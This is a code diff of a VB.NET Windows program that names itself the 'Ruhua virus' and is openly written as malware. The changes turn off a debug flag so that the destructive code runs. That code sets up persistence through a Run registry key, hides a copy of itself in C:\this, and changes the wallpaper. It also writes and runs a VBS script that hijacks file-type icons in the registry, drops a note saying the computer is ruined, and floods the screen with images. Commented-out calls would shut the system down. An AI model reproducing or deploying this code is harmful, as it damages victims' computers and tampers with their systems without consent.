@@ -6,7 +6,7 @@ Imports System.Reflection
 Imports System.Collections.Generic
 Imports 如花病毒.Form2.SoundW
 Imports 反色模块
-
+Imports 如花病毒.My.Resources.Resource1
 Public Class Form2
     Public Declare Function RtlAdjustPrivilege Lib "ntdll" (ByVal Privilege As Long, ByVal Newvalue As Long, ByVal NewThread As Long, ByRef Oldvalue As Long) As Long
     Public Declare Function NtShutdownSystem Lib "ntdll" (ByVal ShutdownAction As Long) As Long
@@ -19,7 +19,7 @@ Public Class Form2
     Public list3 As New List(Of FontStyle) From {FontStyle.Regular, FontStyle.Italic, FontStyle.Bold, FontStyle.Underline, FontStyle.Strikeout}
     Public Random As New Random '定义取随机值函数(性能比rnd好，函数不消耗CPU)
     'Public Declare Function PlaySound Lib "winmm.dll" （ByVal lpszSoundName As String， ByVal hModule As Integer， ByVal dwFlags As Integer） As Integer
-    Const IsDebug As Boolean = True
+    Const IsDebug As Boolean = False 'True为不执行破坏代码，FALSE为执行
     Private a As Long
     Enum SoundW
         Do0 = 264
@@ -33,18 +33,32 @@ Public Class Form2
         T4 = 1000
     End Enum
     Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Dim streamwriter As New StreamWriter(New FileStream("Readme.MD", FileMode.Create))
+        streamwriter.Write("Your computer was damaged by ruhua
+你的电脑被如花亲坏了
+In a word , your computer Not have any hop
+一句话说， 你电脑没救了
+")
+        streamwriter.Flush()
+        streamwriter.Dispose()
+        '////////////////////////////////////////////////////////////////
+        '将资源写入本地硬盘
+        '////////////////////////////////////////////////////////////////
+        Dim rh As Byte() = My.Resources.Resource1.bakgroundimage
         If IsDebug Then GoTo debugTag
-        a = 0
-        Dim ws, fso
         ws = CreateObject("wscript.shell") '定义对象
         fso = CreateObject("scripting.filesystemobject") '定义对象
+        a = 0
         ws.regwrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\病毒子键", "C:\this\rh.exe", "REG_SZ")
         If (Not fso.FolderExists("C:\this")) Then '如果C盘下的this文件夹没有则创建
+            ws.regwrite("HKCU\Control Panel\Desktop\Wallpaper", "C:\this\rh.jpg", "REG_SZ")
             fso.createfolder("C:\this") '创建文件夹
             fso.CopyFile(Application.ExecutablePath, "C:\this\rh.exe")
             ws.run("cmd.exe /c attrib ""C:\this"" +h", 0) '批处理隐藏文件夹
             ws.regwrite("HKCU\Control Panel\Desktop\Wallpaper", "C:\this\rh.jpg", "REG_SZ") 'Load picture file in regedit.exe
-
+            Dim s As Stream = File.Create("C:\this\rh.jpg")
+            s.Write(rh, 0, rh.Length)
+            s.Dispose()
             Dim a
             a = fso.createtextfile("C:\this\a.vbs")
             With a
@@ -72,25 +86,12 @@ Public Class Form2
                 .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\txtfile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                 .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\htmlfile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                 .close
-                .run("C:\this\a.vbs")
             End With
+            ws.run("C:\this\a.vbs") 'run vbs
             Dim o As Object = CreateObject("scripting.filesystemobject")
-            Dim b = o.createtextfile("C:\this\readme.txt")
-            b.writeline("Your computer was damaged by ruhua")
-            b.writeline("你的电脑被如花亲坏了")
-            b.writeline("In a word , your computer not have any hop")
-            b.writeline("一句话说，你电脑没救了")
-            b.close
             'Threading.Thread.Sleep(5000) '延时5秒
             'RtlAdjustPrivilege(&H13, &H1, &H0, &H0) '提升到关机权限
             'NtShutdownSystem(&H0) '关机
-            '////////////////////////////////////////////////////////////////
-            '将资源写入本地硬盘
-            '////////////////////////////////////////////////////////////////
-            Dim rh As Byte() = My.Resources.Resource1.bakgroundimage
-            Dim s As Stream = File.Create("C:\this\rh.jpg")
-            s.Write(rh, 0, rh.Length)
-            s.Close()
             'Dim sound As Byte() = My.Resources.Resource1.sound
             'Dim music As Stream = File.Create("C:\this\sound.mp3")
             'music.Write(sound, 0, sound.Length)
@@ -99,9 +100,7 @@ Public Class Form2
             'this is end
             '////////////////////////////////////////////////////////////////
         End If
-        ws.regwrite("HKCU\Control Panel\Desktop\Wallpaper", "C:\this\rh.jpg", "REG_SZ")
-        ws.run("C:\this\a.vbs") '运行vbs
-debugTag:
+debugTag:'以上都是破坏代码
         Dim newthread0 As New Threading.Thread(AddressOf General)
         newthread0.Start()
         Timer2.Start()
@@ -109,7 +108,7 @@ debugTag:
         newthread3.Start()
     End Sub
     Sub General()
-        Shell("notepad.exe C:\this\readme.txt", AppWinStyle.NormalFocus)
+        Shell("notepad.exe ""Readme.MD""", AppWinStyle.NormalFocus)
         Dim form2 As New Form2
         'form2.Hide()
         Dim newthread As New Threading.Thread(AddressOf ShakeMouse)
@@ -155,7 +154,7 @@ again:
         Dim screen As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow())) 'Get Desktop Graphics
         Do
             Try
-                screen.DrawIcon(ico, MousePosition.X, MousePosition.Y)
+                screen.DrawImage(ico.ToBitmap, MousePosition.X, MousePosition.Y)
                 Threading.Thread.Sleep(10)
             Catch ex As Exception '如果超出内存则运行下面的
                 screen.Dispose() '释放对象和对象句柄
@@ -227,29 +226,11 @@ again:
         www.DrawIcon(Icon.FromHandle(handle), scr.WorkingArea)
     End Sub
     Sub Icoc()
-        Dim ico1 As Icon = My.Resources.Resource1.a
-        Dim ico2 As Icon = My.Resources.Resource1.b
-        Dim ico3 As Icon = My.Resources.Resource1.c
-        Dim ico4 As Icon = My.Resources.Resource1.d
-        Dim ico5 As Icon = My.Resources.Resource1.e
-        Dim ico6 As Icon = My.Resources.Resource1.f
-        Dim ico7 As Icon = My.Resources.Resource1.g
+        Dim imagelist As New List(Of Image) From {My.Resources.Resource1.a.ToBitmap, b.ToBitmap, c.ToBitmap, d.ToBitmap, e.ToBitmap, f.ToBitmap, g.ToBitmap}
         Dim screen As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()))
         Threading.Thread.Sleep(1000 * 40)
         Do
-            screen.DrawIcon(ico1, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
-            Threading.Thread.Sleep(1000)
-            screen.DrawIcon(ico2, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
-            Threading.Thread.Sleep(1000)
-            screen.DrawIcon(ico3, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
-            Threading.Thread.Sleep(1000)
-            screen.DrawIcon(ico4, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
-            Threading.Thread.Sleep(1000)
-            screen.DrawIcon(ico5, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
-            Threading.Thread.Sleep(1000)
-            screen.DrawIcon(ico6, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
-            Threading.Thread.Sleep(1000)
-            screen.DrawIcon(ico7, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
+            screen.DrawImage(imagelist.Item(Random.Next(0, imagelist.Count - 1)), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
             Threading.Thread.Sleep(1000)
         Loop
     End Sub
